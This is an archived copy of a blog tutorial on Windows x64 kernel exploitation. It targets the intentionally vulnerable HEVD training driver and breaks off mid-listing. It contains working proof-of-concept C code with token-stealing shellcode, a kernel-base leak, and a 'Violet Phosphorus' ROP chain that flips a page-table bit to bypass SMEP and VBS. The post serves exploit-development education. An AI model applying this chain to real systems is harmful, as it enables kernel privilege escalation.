<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://wetw0rk.github.io/posts/0x01-killing-windows-kernel-mitigations/">Original</a>
    <h1>0x01 – Killing Windows Kernel Mitigations</h1>
    
    <div id="readability-page-1" class="page"><div>
      
  <article>
    
    <div>
      <p>This post was made possible through hard work and determination. Do not feel frustrated if this stuff does not click immediately and remember, the source of truth will always be the source code. For us, our source code is raw assembly. That said it’s important you understand these techniques in detail because when Microsoft releases new mitigations your foundation is what will allow you to develop bypasses. So, if something is not clear take your time and step through it in the debugger.</p>
<p>In the <a href="https://wetw0rk.github.io/posts/0x00-introduction-to-windows-kernel-exploitation/">last post</a> you should have obtained a solid understanding of the basics of Windows Kernel Exploitation. We will now be jumping off the deep end and exploiting Windows 10 (x64) and Windows 11 (x64). Within this post you will be getting an introduction to some of the latest exploit mitigations offered by Microsoft and how “easily” they can be bypassed. That said only SOME will be covered, more exist but we will only cover them when relevant within this series.</p>
<p>In addition, this post will include the release of my PoC ROP chain - <em>Violet Phosphorus</em>, a universal VBS/SMEP bypass technique.</p>
<p>To prove its effectiveness, I went ahead deployed <em>Violet Phosphorus</em> against Windows 11 24H2 just for this post. If I understand correctly this is the latest version of Windows 11 which was released October 1st, 2024.</p>
<pre tabindex="0"><code>DISCLAIMER: TO BE CLEAR THIS DOES NOT BYPASS HVCI
</code></pre>
<ul>
<li><a href="#entering-the-modern-landscape">Entering the Modern Landscape</a>
<ul>
<li><a href="#bypassing-smep-theory">Bypassing SMEP (Theory)</a>
<ul>
<li><a href="#finding--using-rop-gadgets">Finding &amp; Using ROP Gadgets</a></li>
<li><a href="#finding-the-kernel-base-address">Finding the Kernel Base Address</a></li>
</ul>
</li>
<li><a href="#bypassing-vbs-theory">Bypassing VBS (Theory)</a></li>
</ul>
</li>
<li><a href="#violet-phosphorus">Violet Phosphorus</a>
<ul>
<li><a href="#understanding-the-rop-chain">Understanding the ROP Chain</a></li>
</ul>
</li>
<li><a href="#crafting-a-poc">Crafting a PoC</a></li>
<li><a href="#exploitation-rip--tear">Exploitation (Rip &amp; Tear)</a></li>
<li><a href="#sources">Sources</a></li>
</ul>

<p>Considering we exploited the Stack Overflow within <code>Windows 7 (x86)</code> and having gone in depth in regards to it’s underlying operations. There was no need to re-hash the vulnerability, at least not for this type of bug. That said, we can go ahead and jump straight into exploit development for Windows 10 (x64).</p>
<p>As mentioned in the <a href="https://wetw0rk.github.io/posts/0x00-introduction-to-windows-kernel-exploitation/">last post</a> we will shift languages and use C rather than Python. If you’re using Kali and want to follow along with me, install <em>mingw-w64</em> as this will be what I will be using to compile my exploit code. You can also use <a href="https://visualstudio.microsoft.com/">Visual Studio</a> it’s all based on preference really.</p>
<div><pre tabindex="0"><code data-lang="bash"><span><span>sudo apt install mingw-w64 -y
</span></span></code></pre></div><p>If you’re still new to C, the following can also be accomplished in Python. I intentionally used it in the last post for those who want to jump in without using C. However, you will see that the further you get into exploit development knowledge of C is not optional. That said let’s look at our initial PoC code:</p>
<div><pre tabindex="0"><code data-lang="c"><span><span><span>#include</span> <span>&lt;stdio.h&gt;</span><span>
</span></span></span><span><span><span>#include</span> <span>&lt;stdlib.h&gt;</span><span>
</span></span></span><span><span><span></span>
</span></span><span><span><span>#include</span> <span>&lt;windows.h&gt;</span><span>
</span></span></span><span><span><span></span>
</span></span><span><span><span>#define BUFFER_SIZE 4242
</span></span></span><span><span><span></span>
</span></span><span><span><span>int</span> <span>main</span>()
</span></span><span><span>{
</span></span><span><span>    HANDLE hHEVD                <span>=</span> NULL;
</span></span><span><span>    DWORD bytesReturned         <span>=</span> <span>0</span>;
</span></span><span><span>    <span>char</span> buffer[BUFFER_SIZE]    <span>=</span> {<span>0</span>};
</span></span><span><span>
</span></span><span><span>    <span>printf</span>(<span>&#34;[*] Getting a handle on HEVD</span><span>\n</span><span>&#34;</span>);
</span></span><span><span>
</span></span><span><span>    hHEVD <span>=</span> <span>CreateFileA</span>(<span>&#34;</span><span>\\\\</span><span>.</span><span>\\</span><span>HackSysExtremeVulnerableDriver&#34;</span>,
</span></span><span><span>                        (GENERIC_READ <span>|</span> GENERIC_WRITE),
</span></span><span><span>                        <span>0x00</span>,
</span></span><span><span>                        NULL,
</span></span><span><span>                        OPEN_EXISTING,
</span></span><span><span>                        FILE_ATTRIBUTE_NORMAL,
</span></span><span><span>                        NULL);
</span></span><span><span>
</span></span><span><span>    <span>if</span> (hHEVD <span>==</span> INVALID_HANDLE_VALUE)
</span></span><span><span>    {
</span></span><span><span>        <span>printf</span>(<span>&#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver</span><span>\n</span><span>&#34;</span>);
</span></span><span><span>        <span>return</span> <span>-</span><span>1</span>;
</span></span><span><span>    }
</span></span><span><span>
</span></span><span><span>    <span>printf</span>(<span>&#34;[*] Generating evil buffer...&#34;</span>);
</span></span><span><span>    <span>memset</span>(buffer, <span>&#39;A&#39;</span>, <span>3000</span>);
</span></span><span><span>
</span></span><span><span>    <span>printf</span>(<span>&#34;[*] Triggering control code 0x222003</span><span>\n</span><span>&#34;</span>);
</span></span><span><span>    <span>DeviceIoControl</span>(hHEVD,
</span></span><span><span>                    <span>0x222003</span>,
</span></span><span><span>                    buffer,
</span></span><span><span>                    BUFFER_SIZE,
</span></span><span><span>                    NULL,
</span></span><span><span>                    <span>0x00</span>,
</span></span><span><span>                    <span>&amp;</span>bytesReturned,
</span></span><span><span>                    NULL);
</span></span><span><span>}
</span></span></code></pre></div><p>We can compile it using a cross compiler from mingw from within Linux (<em>x86_64-w64-mingw32-gcc poc.c -o poc.exe</em>). Once sent, we can see that we have successfully achieved memory corruption :)</p>
<p><img src="https://wetw0rk.github.io/0x01-Killing-Windows-Kernel-Mitigations/corruption.png" alt="alt text"/></p>
<p>Let’s update the PoC this time we’ll include shellcode (Generated with <a href="https://github.com/wetw0rk/Sickle">Sickle</a>).</p>
<div><pre tabindex="0"><code data-lang="c"><span><span><span>#include</span> <span>&lt;stdio.h&gt;</span><span>
</span></span></span><span><span><span>#include</span> <span>&lt;stdlib.h&gt;</span><span>
</span></span></span><span><span><span>#include</span> <span>&lt;stdint.h&gt;</span><span>
</span></span></span><span><span><span></span>
</span></span><span><span><span>#include</span> <span>&lt;windows.h&gt;</span><span>
</span></span></span><span><span><span></span>
</span></span><span><span><span>#define BUFFER_SIZE 4242
</span></span></span><span><span><span></span>
</span></span><span><span><span>int</span> <span>main</span>()
</span></span><span><span>{
</span></span><span><span>    HANDLE hHEVD <span>=</span> NULL;
</span></span><span><span>    LPVOID lpMemory <span>=</span> NULL;
</span></span><span><span>    DWORD bytesReturned <span>=</span> <span>0</span>;
</span></span><span><span>
</span></span><span><span>    <span>int</span> i <span>=</span> <span>0</span>;
</span></span><span><span>    <span>int</span> shellcodeLength <span>=</span> <span>62</span>;
</span></span><span><span>    <span>int64_t</span> buffer[BUFFER_SIZE] <span>=</span> {<span>0</span>};
</span></span><span><span>
</span></span><span><span>    <span>char</span> shellcode[] <span>=</span>
</span></span><span><span>    <span>// python3 sickle.py -p windows/x64/kernel_token_stealer -f c -m pinpoint
</span></span></span><span><span><span></span>
</span></span><span><span>    <span>&#34;</span><span>\x65\x48\xa1\x88\x01\x00\x00\x00\x00\x00\x00</span><span>&#34;</span> <span>// movabs rax, qword ptr gs:[0x188]
</span></span></span><span><span><span></span>    <span>&#34;</span><span>\x48\x8b\x80\xb8\x00\x00\x00</span><span>&#34;</span>                 <span>// mov rax, qword ptr [rax + 0xb8]
</span></span></span><span><span><span></span>    <span>&#34;</span><span>\x48\x89\xc1</span><span>&#34;</span>                                 <span>// mov rcx, rax
</span></span></span><span><span><span></span>    <span>&#34;</span><span>\xb2\x04</span><span>&#34;</span>                                     <span>// mov dl, 4
</span></span></span><span><span><span></span>    <span>&#34;</span><span>\x48\x8b\x80\x48\x04\x00\x00</span><span>&#34;</span>                 <span>// mov rax, qword ptr [rax + 0x448]
</span></span></span><span><span><span></span>    <span>&#34;</span><span>\x48\x2d\x48\x04\x00\x00</span><span>&#34;</span>                     <span>// sub rax, 0x448
</span></span></span><span><span><span></span>    <span>&#34;</span><span>\x38\x90\x40\x04\x00\x00</span><span>&#34;</span>                     <span>// cmp byte ptr [rax + 0x440], dl
</span></span></span><span><span><span></span>    <span>&#34;</span><span>\x75\xeb</span><span>&#34;</span>                                     <span>// jne 0x1017
</span></span></span><span><span><span></span>    <span>&#34;</span><span>\x48\x8b\x90\xb8\x04\x00\x00</span><span>&#34;</span>                 <span>// mov rdx, qword ptr [rax + 0x4b8]
</span></span></span><span><span><span></span>    <span>&#34;</span><span>\x48\x89\x91\xb8\x04\x00\x00</span><span>&#34;</span>                 <span>// mov qword ptr [rcx + 0x4b8], rdx
</span></span></span><span><span><span></span>
</span></span><span><span>    <span>&#34;</span><span>\x5d</span><span>&#34;</span>          <span>// pop rbp
</span></span></span><span><span><span></span>    <span>&#34;</span><span>\xc2\x08\x00</span><span>&#34;</span>; <span>// ret 8
</span></span></span><span><span><span></span>
</span></span><span><span>
</span></span><span><span>    <span>printf</span>(<span>&#34;[*] Getting a handle on HEVD</span><span>\n</span><span>&#34;</span>);
</span></span><span><span>
</span></span><span><span>    hHEVD <span>=</span> <span>CreateFileA</span>(<span>&#34;</span><span>\\\\</span><span>.</span><span>\\</span><span>HackSysExtremeVulnerableDriver&#34;</span>,
</span></span><span><span>                        (GENERIC_READ <span>|</span> GENERIC_WRITE),
</span></span><span><span>                        <span>0x00</span>,
</span></span><span><span>                        NULL,
</span></span><span><span>                        OPEN_EXISTING,
</span></span><span><span>                        FILE_ATTRIBUTE_NORMAL,
</span></span><span><span>                        NULL);
</span></span><span><span>
</span></span><span><span>    <span>if</span> (hHEVD <span>==</span> INVALID_HANDLE_VALUE)
</span></span><span><span>    {
</span></span><span><span>        <span>printf</span>(<span>&#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver</span><span>\n</span><span>&#34;</span>);
</span></span><span><span>        <span>return</span> <span>-</span><span>1</span>;
</span></span><span><span>    }
</span></span><span><span>
</span></span><span><span>    <span>printf</span>(<span>&#34;[*] Allocating RWX memory</span><span>\n</span><span>&#34;</span>);
</span></span><span><span>    lpMemory <span>=</span> <span>VirtualAlloc</span>(NULL,
</span></span><span><span>                            shellcodeLength,
</span></span><span><span>                            (MEM_COMMIT <span>|</span> MEM_RESERVE),
</span></span><span><span>                            PAGE_EXECUTE_READWRITE);
</span></span><span><span>
</span></span><span><span>    <span>printf</span>(<span>&#34;[*] Copying shellcode into RWX memory</span><span>\n</span><span>&#34;</span>);
</span></span><span><span>    <span>memcpy</span>(lpMemory, shellcode, shellcodeLength);
</span></span><span><span>
</span></span><span><span>    <span>printf</span>(<span>&#34;[*] Spraying return address: 0x%p</span><span>\n</span><span>&#34;</span>, lpMemory);
</span></span><span><span>    <span>for</span> (i <span>=</span> <span>0</span>; i <span>&lt;</span> <span>270</span>; i<span>++</span>)
</span></span><span><span>    {
</span></span><span><span>        <span>/* Spray the return address, who cares about accuracy ;) */</span>
</span></span><span><span>        buffer[i] <span>=</span> (<span>int64_t</span>)lpMemory;
</span></span><span><span>    }
</span></span><span><span>
</span></span><span><span>    <span>printf</span>(<span>&#34;[*] Triggering control code 0x222003</span><span>\n</span><span>&#34;</span>);
</span></span><span><span>    <span>DeviceIoControl</span>(hHEVD,
</span></span><span><span>                    <span>0x222003</span>,
</span></span><span><span>                    buffer,
</span></span><span><span>                    BUFFER_SIZE,
</span></span><span><span>                    NULL,
</span></span><span><span>                    <span>0x00</span>,
</span></span><span><span>                    <span>&amp;</span>bytesReturned,
</span></span><span><span>                    NULL);
</span></span><span><span>}
</span></span></code></pre></div><p>Let’s try to allocate memory as we did before in <code>Windows 7 (x86)</code>. When we jump to it we get the following error:</p>
<p><img src="https://wetw0rk.github.io/0x01-Killing-Windows-Kernel-Mitigations/attempt_failed_exec_userland_code.png" alt="alt text"/></p>
<p>After a bit of research on the error we can confirm we’re dealing with <strong>SMEP (Supervisor Mode Execution Prevention)</strong> which is a memory protection built into modern Windows OS’s since Windows 8. Assuming you’re familiar with userland exploitation imagine this as DEP only the focus is preventing code execution within user-mode memory. This is oversimplifying it but for the sake of this tutorial we won’t dive any deeper. All we need to do is find a way to bypass it, that is our objective.</p>
<h2 id="bypassing-smep-theory">Bypassing SMEP (Theory)</h2>
<p>To bypass SMEP we’re likely going to need to deploy some ROP, just as we would if we encountered DEP in a user-mode context. If you’re familiar with Linux Kernel exploitation your brain might also go to SMAP. This is good since we’ll be dealing with bits. In short, SMEP is enabled by setting the 20th bit of the CR4 register. In theory, this can be modified by the Kernel, hence why ROP is an ideal technique to deploy.</p>
<p>Let’s look at this in WinDbg.</p>
<p><img src="https://wetw0rk.github.io/0x01-Killing-Windows-Kernel-Mitigations/cr4.png" alt="alt text"/></p>
<p>When flipping the bits of any number, we are in essence changing the value. To see what number we’d need to place here be representative of flipping the 20th bit I wrote a simple C program to generate the number for me. The code to do this, can be seen below:</p>
<div><pre tabindex="0"><code data-lang="c"><span><span><span>/* wetw0rk */</span>
</span></span><span><span>
</span></span><span><span><span>#include</span> <span>&lt;stdio.h&gt;</span><span>
</span></span></span><span><span><span>#include</span> <span>&lt;stdint.h&gt;</span><span>
</span></span></span><span><span><span>#include</span> <span>&lt;stdlib.h&gt;</span><span>
</span></span></span><span><span><span></span>
</span></span><span><span><span>// https://stackoverflow.com/questions/111928/is-there-a-printf-converter-to-print-in-binary-format
</span></span></span><span><span><span></span><span>#define PRINTF_BINARY_PATTERN_INT8 &#34;%c%c%c%c%c%c%c%c &#34;
</span></span></span><span><span><span>#define PRINTF_BYTE_TO_BINARY_INT8(i)    \
</span></span></span><span><span><span>    (((i) &amp; 0x80ll) ? &#39;1&#39; : &#39;0&#39;), \
</span></span></span><span><span><span>    (((i) &amp; 0x40ll) ? &#39;1&#39; : &#39;0&#39;), \
</span></span></span><span><span><span>    (((i) &amp; 0x20ll) ? &#39;1&#39; : &#39;0&#39;), \
</span></span></span><span><span><span>    (((i) &amp; 0x10ll) ? &#39;1&#39; : &#39;0&#39;), \
</span></span></span><span><span><span>    (((i) &amp; 0x08ll) ? &#39;1&#39; : &#39;0&#39;), \
</span></span></span><span><span><span>    (((i) &amp; 0x04ll) ? &#39;1&#39; : &#39;0&#39;), \
</span></span></span><span><span><span>    (((i) &amp; 0x02ll) ? &#39;1&#39; : &#39;0&#39;), \
</span></span></span><span><span><span>    (((i) &amp; 0x01ll) ? &#39;1&#39; : &#39;0&#39;)
</span></span></span><span><span><span></span>
</span></span><span><span><span>#define PRINTF_BINARY_PATTERN_INT16 \
</span></span></span><span><span><span>    PRINTF_BINARY_PATTERN_INT8              PRINTF_BINARY_PATTERN_INT8
</span></span></span><span><span><span>#define PRINTF_BYTE_TO_BINARY_INT16(i) \
</span></span></span><span><span><span>    PRINTF_BYTE_TO_BINARY_INT8((i) &gt;&gt; 8),   PRINTF_BYTE_TO_BINARY_INT8(i)
</span></span></span><span><span><span>#define PRINTF_BINARY_PATTERN_INT32 \
</span></span></span><span><span><span>    PRINTF_BINARY_PATTERN_INT16             PRINTF_BINARY_PATTERN_INT16
</span></span></span><span><span><span>#define PRINTF_BYTE_TO_BINARY_INT32(i) \
</span></span></span><span><span><span>    PRINTF_BYTE_TO_BINARY_INT16((i) &gt;&gt; 16), PRINTF_BYTE_TO_BINARY_INT16(i)
</span></span></span><span><span><span>#define PRINTF_BINARY_PATTERN_INT64    \
</span></span></span><span><span><span>    PRINTF_BINARY_PATTERN_INT32             PRINTF_BINARY_PATTERN_INT32
</span></span></span><span><span><span>#define PRINTF_BYTE_TO_BINARY_INT64(i) \
</span></span></span><span><span><span>    PRINTF_BYTE_TO_BINARY_INT32((i) &gt;&gt; 32), PRINTF_BYTE_TO_BINARY_INT32(i)
</span></span></span><span><span><span></span>
</span></span><span><span><span>/*
</span></span></span><span><span><span> * flip_bit: simple function to flip a bit, for CR4 this would be 20
</span></span></span><span><span><span> */</span>
</span></span><span><span><span>uint64_t</span> <span>flip_bit</span>(<span>uint64_t</span> cr4, <span>unsigned</span> <span>int</span> bit_position)
</span></span><span><span>{
</span></span><span><span>  <span>unsigned</span> <span>int</span> mask <span>=</span> <span>1</span> <span>&lt;&lt;</span> (bit_position <span>-</span> <span>1</span>);
</span></span><span><span>  <span>return</span> (cr4 <span>^</span> mask);
</span></span><span><span>}
</span></span><span><span>
</span></span><span><span><span>int</span> <span>main</span>(<span>int</span> argc, <span>char</span> <span>*</span>argv[])
</span></span><span><span>{
</span></span><span><span>  <span>uint64_t</span> num <span>=</span> <span>0</span>;
</span></span><span><span>
</span></span><span><span>  <span>if</span> (argc <span>&lt;</span> <span>2</span>) {
</span></span><span><span>    <span>printf</span>(<span>&#34;Usage: %s &lt;current cr4 value&gt;</span><span>\n</span><span>&#34;</span>, argv[<span>0</span>]);
</span></span><span><span>    <span>return</span> <span>-</span><span>1</span>;
</span></span><span><span>  }
</span></span><span><span>
</span></span><span><span>  num <span>=</span> <span>strtoll</span>(argv[<span>1</span>], NULL, <span>0</span>);
</span></span><span><span>
</span></span><span><span>  <span>printf</span>(<span>&#34;OLD CR4:</span><span>\n\n\t</span><span>&#34;</span>);
</span></span><span><span>  <span>printf</span>(PRINTF_BINARY_PATTERN_INT64, <span>PRINTF_BYTE_TO_BINARY_INT64</span>(num));
</span></span><span><span>  <span>putchar</span>(<span>&#39;\n&#39;</span>);
</span></span><span><span>
</span></span><span><span>  num <span>=</span> <span>flip_bit</span>(num, <span>20</span>);
</span></span><span><span>
</span></span><span><span>  <span>printf</span>(<span>&#34;NEW CR4</span><span>\n\n\t</span><span>&#34;</span>);
</span></span><span><span>  <span>printf</span>(PRINTF_BINARY_PATTERN_INT64, <span>PRINTF_BYTE_TO_BINARY_INT64</span>(num));
</span></span><span><span>  <span>putchar</span>(<span>&#39;\n&#39;</span>);
</span></span><span><span>
</span></span><span><span>  <span>printf</span>(<span>&#34;</span><span>\n</span><span>Result: 0x%lx</span><span>\n</span><span>&#34;</span>, num);
</span></span><span><span>}
</span></span></code></pre></div><p>Let’s run it.</p>
<pre tabindex="0"><code>$ ./get_cr4 0x0000000000b50ef8
OLD CR4:

        00000000 00000000 00000000 00000000 00000000 10110101 00001110 11111000 
NEW CR4

        00000000 00000000 00000000 00000000 00000000 10111101 00001110 11111000 

Result: 0xbd0ef8
</code></pre><p>So basically we have to place this value into CR4 to turn off SMEP… While researching this I came across a blog post by <a href="https://fluidattacks.com/blog/hevd-smep-bypass/">fluidattacks</a> and noticed he used a ROP gadget in the <code>nt</code> module, specifically <code>KeFlushCurrentTb</code>. We can get our current running version using WinDbg via <code>vertarget</code>. When ran on our target, this was the currently installed Windows version:</p>
<p><img src="https://wetw0rk.github.io/0x01-Killing-Windows-Kernel-Mitigations/vertarget.png" alt="alt text"/></p>
<p>That said, this gadget would not be available to us. If we check for other similar functions we find a similar gadget within <code>nt!KeFlushCurrentTbImmediatley</code> with the main difference being <code>RCX</code> being used to modify CR4 instead of <code>EAX</code>:</p>
<p><img src="https://wetw0rk.github.io/0x01-Killing-Windows-Kernel-Mitigations/KeFlush.png" alt="alt text"/></p>
<p>Since addresses are randomized, we need to calculate the offset of that ROP gadget from the start of the <code>nt</code> module:</p>
<p><img src="https://wetw0rk.github.io/0x01-Killing-Windows-Kernel-Mitigations/rva.png" alt="alt text"/></p>
<p>Here we see the offset is <code>0x000000000039dc27</code>.</p>
<h3 id="finding--using-rop-gadgets">Finding &amp; Using ROP Gadgets</h3>
<p>Now we need to find a <code>pop rcx; ret</code> gadget to place the new <code>CR4</code> value into <code>RCX</code>. We can find one using <a href="https://github.com/0vercl0k/rp">rp++</a>, which has quickly become my favorite ROP gadget tool. Here we search for gadgets within <code>ntoskrnl.exe</code> since this is the primary kernel file for the Windows OS. To do this you can use the following syntax:</p>
<pre tabindex="0"><code>rp-win.exe --rop=50 --va=0 --file C:\Windows\System32\ntoskrnl.exe &gt; rop.txt
</code></pre><p>We can then parse the results using powershell.</p>
<p><img src="https://wetw0rk.github.io/0x01-Killing-Windows-Kernel-Mitigations/pwoershell.png" alt="alt text"/></p>
<p>Using these offsets we can confirm we have a working gadget in WinDbg.</p>
<p><img src="https://wetw0rk.github.io/0x01-Killing-Windows-Kernel-Mitigations/confirm.png" alt="alt text"/></p>
<p>However, we still have to deal with the randomization of the <code>nt</code> module itself…</p>
<h3 id="finding-the-kernel-base-address">Finding the Kernel Base Address</h3>
<p>If you peeked into my brain during this period of learning, you would have observed unadulterated fear. Since under a user-mode exploit you would normally now require a read primitive to get the base address of a loaded module. However, with a little bit of research you’ll find there are multiple methods to obtain the base address of <code>nt</code> (or any other loaded module for that matter) from medium integrity (default user configuration).</p>
<p>I ended up using a known method of leveraging <code>EnumDeviceDrivers</code> to obtain the base address.</p>
<p>The code I used can be seen below:</p>
<div><pre tabindex="0"><code data-lang="c"><span><span><span>int</span> <span>GetKernelBaseAddress</span>()
</span></span><span><span>{
</span></span><span><span>    ULONG_PTR pKernelBaseAddress <span>=</span> <span>0</span>;
</span></span><span><span>    LPVOID <span>*</span>lpImageBase <span>=</span> NULL;
</span></span><span><span>    DWORD dwBytesNeeded <span>=</span> <span>0</span>;
</span></span><span><span>
</span></span><span><span>    <span>if</span> (<span>!</span><span>EnumDeviceDrivers</span>(NULL, <span>0</span>, <span>&amp;</span>dwBytesNeeded)) {
</span></span><span><span>        <span>printf</span>(<span>&#34;[-] Failed to calculate bytes needed for device driver entries&#34;</span>);
</span></span><span><span>        <span>return</span> <span>-</span><span>1</span>;
</span></span><span><span>    }
</span></span><span><span>
</span></span><span><span>    <span>if</span> (<span>!</span>(lpImageBase <span>=</span> (LPVOID <span>*</span>)<span>HeapAlloc</span>(<span>GetProcessHeap</span>(), <span>0</span>, dwBytesNeeded))) {
</span></span><span><span>        <span>printf</span>(<span>&#34;[-] Failed to allocate heap for lpImageBase</span><span>\n</span><span>&#34;</span>);
</span></span><span><span>        <span>if</span> (lpImageBase) {
</span></span><span><span>            <span>HeapFree</span>(<span>GetProcessHeap</span>(), <span>0</span>, lpImageBase);
</span></span><span><span>        }
</span></span><span><span>        <span>return</span> <span>-</span><span>1</span>;
</span></span><span><span>    }
</span></span><span><span>
</span></span><span><span>    <span>if</span> (<span>!</span><span>EnumDeviceDrivers</span>(lpImageBase, dwBytesNeeded, <span>&amp;</span>dwBytesNeeded)) {
</span></span><span><span>        <span>printf</span>(<span>&#34;[-] EnumDeviceDrivers: %d&#34;</span>, <span>GetLastError</span>());
</span></span><span><span>        <span>if</span> (lpImageBase) {
</span></span><span><span>             <span>HeapFree</span>(<span>GetProcessHeap</span>(), <span>0</span>, lpImageBase);
</span></span><span><span>        }
</span></span><span><span>        <span>return</span> <span>-</span><span>1</span>;
</span></span><span><span>    }
</span></span><span><span>
</span></span><span><span>    pKernelBaseAddress <span>=</span> ((ULONG_PTR <span>*</span>)lpImageBase)[<span>0</span>];
</span></span><span><span>    <span>HeapFree</span>(<span>GetProcessHeap</span>(), <span>0</span>, lpImageBase);
</span></span><span><span>
</span></span><span><span>    <span>printf</span>(<span>&#34;[*] Kernel Base Address: %llx</span><span>\n</span><span>&#34;</span>, pKernelBaseAddress);
</span></span><span><span>
</span></span><span><span>    <span>return</span> pKernelBaseAddress;
</span></span><span><span>}
</span></span></code></pre></div><p>With that we should have everything needed to get code execution! Right? Wrong :(</p>
<p><img src="https://wetw0rk.github.io/0x01-Killing-Windows-Kernel-Mitigations/error.png" alt="alt text"/></p>
<p>When putting everything together, we get the error above (ignore the different gadget location I tried changing it at this point because I could not fathom this not working).</p>
<p>What happened? Well… it looks like we encountered a new memory protection that I have not heard of. We’ve run into <a href="https://www.blackhat.com/docs/us-16/materials/us-16-Weston-Windows-10-Mitigation-Improvements.pdf">Virtualization-Based Security (VBS)</a>, which means any <a href="https://www.microsoft.com/en-us/security/blog/2017/03/27/detecting-and-mitigating-elevation-of-privilege-exploit-for-cve-2017-0005/#:~:text=Unauthorized%20modifications,instantly.">“unauthorized modifications of the CR4 control register bitfields, including the SMEP field, are blocked instantly”</a>.</p>
<h2 id="bypassing-vbs-theory">Bypassing VBS (Theory)</h2>
<p>Having conducted a bit of research into how others have approached this, the idea here is to flip a bit within a Page Table Entry (PTE) respective to the memory location of our usermode shellcode.</p>
<p>If we recall when we tried to execute the shellcode directly we got the following error:</p>
<p><img src="https://wetw0rk.github.io/0x01-Killing-Windows-Kernel-Mitigations/error_pte.png" alt="alt text"/></p>
<p>Basically, the way SMEP is enforced is on a per memory basis, via the U/S PTE control bit. Let’s look at the output of <code>!pte</code> in WinDbg in regards to the user mode shellcode allocation to try to understand the page table entry permissions.</p>
<p><img src="https://wetw0rk.github.io/0x01-Killing-Windows-Kernel-Mitigations/pte_output.png" alt="alt text"/></p>
<p>So what would happen if we were to clear the user mode bit (U)? If flipped, this page in thoery becomes a Kernel mode page. The bit location of U can be seen below.</p>
<p><img src="https://wetw0rk.github.io/0x01-Killing-Windows-Kernel-Mitigations/pte_bits.png" alt="alt text"/></p>
<p>Let’s set a breakpoint at <code>HEVD+0x866b9</code> and reboot to test this. Once our breakpoint is hit, we can modify the PTE as shown below. Once execution is continued you can see we successfully get code execution as we overwrite RAX with 0xDEADBEEF (psuedo shellcode).</p>
<p><img src="https://wetw0rk.github.io/0x01-Killing-Windows-Kernel-Mitigations/flip_bit.png" alt="alt text"/></p>
<p>Sweet, we have a solid bypass route for SMEP and VBS but how can we do this dynamically…</p>

<p>With our analysis complete I decided to put my theory into practice and created <code>Violet Phosphorus</code> a universal and generic SMEP/VBS bypass. Can we call this the successor of the <a href="https://www.corelan.be/index.php/2011/07/03/universal-depaslr-bypass-with-msvcr71-dll-and-mona-py/">White Phosphorus Exploit Pack</a>? Or would that be too much… you can find the ROP chain below:</p>
<div><pre tabindex="0"><code data-lang="c"><span><span>  <span>/* Prepare RDX register for later. This is needed for the XOR operation */</span>
</span></span><span><span>  buffer[i<span>++</span>] <span>=</span> kernel_base <span>+</span> <span>0x3f99ce</span>; <span>// pop rdx ; pop rax ; pop rcx ; ret [nt]
</span></span></span><span><span><span></span>  buffer[i<span>++</span>] <span>=</span>               <span>0x000008</span>; <span>// Set RDX to 0x08, we will need this to accomplish the XOR
</span></span></span><span><span><span></span>  buffer[i<span>++</span>] <span>=</span>               <span>0x000000</span>; <span>// [filler]
</span></span></span><span><span><span></span>  buffer[i<span>++</span>] <span>=</span>               <span>0x000000</span>; <span>// [filler]
</span></span></span><span><span><span></span>
</span></span><span><span>  <span>/* Setup the call to MiGetPteAddress in order to get the address of the PTE for our
</span></span></span><span><span><span>     userland code. The setup is as follows:
</span></span></span><span><span><span>  
</span></span></span><span><span><span>       RAX -&gt; VOID *MiGetPteAddress(
</span></span></span><span><span><span>         ( RCX == PTE / Userland Code )
</span></span></span><span><span><span>       );
</span></span></span><span><span><span>
</span></span></span><span><span><span>     Once the call is complete RAX should contain the pointer to our PTE. */</span>
</span></span><span><span>  buffer[i<span>++</span>] <span>=</span> kernel_base <span>+</span> <span>0xa74d93</span>; <span>// pop rcx ; ret     [nt]
</span></span></span><span><span><span></span>  buffer[i<span>++</span>] <span>=</span> (<span>int64_t</span>)shellcode;     <span>// *shellcode        [nt]
</span></span></span><span><span><span></span>  buffer[i<span>++</span>] <span>=</span> kernel_base <span>+</span> <span>0x26b560</span>; <span>// MiGetPteAddress() [nt]
</span></span></span><span><span><span></span>
</span></span><span><span>  <span>/* Now that we have obtained the PTE address, we can modify the 2nd bit in order to
</span></span></span><span><span><span>     mark the page as a kernel page (U -&gt; K). We can do this using XOR ;) */</span>
</span></span><span><span>  buffer[i<span>++</span>] <span>=</span> kernel_base <span>+</span> <span>0x2ffbfb</span>; <span>// sub rax, rdx ; ret                [nt]
</span></span></span><span><span><span></span>  buffer[i<span>++</span>] <span>=</span> kernel_base <span>+</span> <span>0xa6f2f5</span>; <span>// push rax ; pop rbx ; ret          [nt]
</span></span></span><span><span><span></span>  buffer[i<span>++</span>] <span>=</span> kernel_base <span>+</span> <span>0x3f99ce</span>; <span>// pop rdx ; pop rax ; pop rcx ; ret [nt]
</span></span></span><span><span><span></span>  buffer[i<span>++</span>] <span>=</span>               <span>0x000004</span>; <span>// When we XOR the PTE by 0x4 we flip the 2nd bit (U -&gt; K)
</span></span></span><span><span><span></span>  buffer[i<span>++</span>] <span>=</span>               <span>0x000000</span>; <span>// [filler]
</span></span></span><span><span><span></span>  buffer[i<span>++</span>] <span>=</span>               <span>0x000000</span>; <span>// [filler]
</span></span></span><span><span><span></span>  buffer[i<span>++</span>] <span>=</span> kernel_base <span>+</span> <span>0x2107b2</span>; <span>// xor  [rbx+0x08], edx ; mov rbx, qword [rsp+0x60] ; add rsp, 0x40 ; pop r14 ; pop rdi ; pop rbp ; ret [nt]
</span></span></span></code></pre></div><h2 id="understanding-the-rop-chain">Understanding the ROP Chain</h2>
<p>Let’s be honest there exists other ways to bypass VBS/SMEP but from what I’ve seen most require a leak. Why suffer when Microsoft gives us a function to get this information dynamically? Below is the ASM code within WinDbg of the <em>MiGetPteAddress()</em> function.</p>
<pre tabindex="0"><code>0: kd&gt; u nt!MiGetPteAddress
nt!MiGetPteAddress:
fffff800`4d67f770 48c1e909                shr     rcx,9
fffff800`4d67f774 48b8f8ffffff7f000000    mov rax,7FFFFFFFF8h
fffff800`4d67f77e 4823c8                  and     rcx,rax
